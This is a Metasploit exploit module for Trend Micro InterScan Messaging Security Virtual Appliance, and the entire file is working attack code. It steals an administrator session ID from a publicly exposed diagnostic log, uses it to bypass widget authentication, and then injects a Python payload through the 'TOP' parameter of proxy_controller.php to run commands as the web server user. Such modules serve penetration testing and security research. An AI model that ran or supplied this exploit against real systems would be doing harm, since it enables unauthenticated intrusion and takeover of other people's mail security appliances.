# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Trend Micro InterScan Messaging Security (Virtual Appliance) Remote Code Execution",
      &#039;Description&#039;    => %q{
        This module exploits the authentication bypass and command injection vulnerability together. Unauthenticated users can execute a
        terminal command under the context of the web server user.
 
        The specific flaw exists within the management interface, which listens on TCP port 443 by default. Trend Micro IMSVA product
        have widget feature which is implemented with PHP. Insecurely configured web server exposes diagnostic.log file, which
        leads to an extraction of JSESSIONID value from administrator session. Proxy.php files under the mod TMCSS folder takes multiple parameter but the process
        does not properly validate a user-supplied string before using it to execute a system call. Due to combination of these vulnerabilities,
        unauthenticated users can execute a terminal command under the context of the web server user.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;mr_me <mr_me@offensive-security.com>&#039;, # author of command injection
          &#039;Mehmet Ince <mehmet@mehmetince.net>&#039; # author of authentication bypass & msf module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://pentest.blog/one-ring-to-rule-them-all-same-rce-on-multiple-trend-micro-products/&#039;],
          [&#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-17-521/&#039;],
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;SSL&#039; => true,
          &#039;RPORT&#039; => 8445
        },
      &#039;Payload&#039;        =>
        {
          &#039;Compat&#039;      =>
            {
              &#039;ConnectionType&#039; => &#039;-bind&#039;
            },
        },
      &#039;Platform&#039;       => [&#039;python&#039;],
      &#039;Arch&#039;           => ARCH_PYTHON,
      &#039;Targets&#039;        => [[ &#039;Automatic&#039;, {}]],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Oct 7 2017",
      &#039;DefaultTarget&#039;  => 0
    ))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the Trend Micro IMSVA management interface&#039;, &#039;/&#039;])
      ]
    )
  end
 
  def extract_jsessionid
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;widget&#039;, &#039;repository&#039;, &#039;log&#039;, &#039;diagnostic.log&#039;)
    })
    if res && res.code == 200 && res.body.include?(&#039;JSEEEIONID&#039;)
      res.body.scan(/JSEEEIONID:([A-F0-9]{32})/).flatten.last
    else
      nil
    end
  end
 
  def widget_auth(jsessionid)
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;widget&#039;, &#039;index.php&#039;),
      &#039;cookie&#039; => "CurrentLocale=en-U=en_US; JSESSIONID=#{jsessionid}"
    })
    if res && res.code == 200 && res.body.include?(&#039;USER_GENERATED_WIDGET_DIR&#039;)
      res.get_cookies
    else
      nil
    end
  end
 
  def check
    # If we&#039;ve managed to bypass authentication, that means target is most likely vulnerable.
    jsessionid = extract_jsessionid
    if jsessionid.nil?
      return Exploit::CheckCode::Safe
    end
    auth = widget_auth(jsessionid)
    if auth.nil?
      Exploit::CheckCode::Safe
    else
      Exploit::CheckCode::Appears
    end
  end
 
  def exploit
    print_status(&#039;Extracting JSESSIONID from publicly accessible log file&#039;)
    jsessionid = extract_jsessionid
    if jsessionid.nil?
      fail_with(Failure::NotVulnerable, "Target is not vulnerable.")
    else
      print_good("Awesome. JSESSIONID value = #{jsessionid}")
    end
 
    print_status(&#039;Initiating session with widget framework&#039;)
    cookies = widget_auth(jsessionid)
    if cookies.nil?
      fail_with(Failure::NoAccess, "Latest JSESSIONID is expired. Wait for sysadmin to login IMSVA")
    else
      print_good(&#039;Session with widget framework successfully initiated.&#039;)
    end
 
    print_status(&#039;Trigerring command injection vulnerability&#039;)
    send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;widget&#039;, &#039;proxy_controller.php&#039;),
      &#039;cookie&#039; => "CurrentLocale=en-US; LogonUser=root; JSESSIONID=#{jsessionid}; #{cookies}",
      &#039;vars_post&#039; => {
        &#039;module&#039; => &#039;modTMCSS&#039;,
        &#039;serverid&#039; => &#039;1&#039;,
        &#039;TOP&#039; => "$(python -c \"#{payload.encoded}\")"
      }
    })
  end
end

